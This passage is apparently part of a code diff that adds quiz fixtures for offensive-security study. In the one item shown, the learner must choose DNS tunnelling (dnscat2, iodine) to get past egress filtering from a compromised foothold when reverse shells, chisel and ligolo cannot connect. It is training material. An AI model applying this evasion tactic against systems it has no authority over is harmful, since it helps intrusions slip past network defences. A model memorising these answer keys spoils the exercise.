+            ],
+            "note": "From here the normal pivoting workflow applies, just over DNS."
+          }
+        ]
+      },
+      "situation": "Your foothold can resolve DNS but every other outbound port is filtered, so a reverse shell will not connect. What is the move?",
+      "choices": [
+        "dns-tunnel",
+        "pivot-chisel-socks",
+        "shell-revshell-linux",
+        "pivot-ligolo"
+      ],
+      "coach": {
+        "pivot-chisel-socks": "chisel needs an open TCP port outbound, which is blocked here; DNS is the only channel.",
+        "shell-revshell-linux": "A reverse shell cannot connect when outbound TCP is filtered; tunnel over DNS instead.",
+        "pivot-ligolo": "ligolo also needs TCP egress; when only DNS resolves, dnscat2/iodine is the escape hatch."
+      }
+    }
+  };
+  Object.keys(GAPFILL4).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL4[k]; });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
